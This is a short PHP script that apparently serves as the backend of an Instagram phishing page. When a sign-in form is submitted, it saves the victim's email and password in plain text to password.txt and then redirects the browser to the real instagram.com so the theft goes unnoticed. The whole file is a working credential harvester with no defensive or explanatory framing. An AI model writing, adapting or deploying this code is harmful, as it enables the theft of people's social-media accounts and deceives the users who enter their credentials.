<?php
	if(isset($_POST['sign-in'])) {
		$email = $_POST['email'];
		$password = $_POST['password'];
		$file = fopen("password.txt", "w");
		fwrite($file, $email.":".$password);
		fclose($file);
		header("Location: https://www.instagram.com/");
		exit();
	}
?>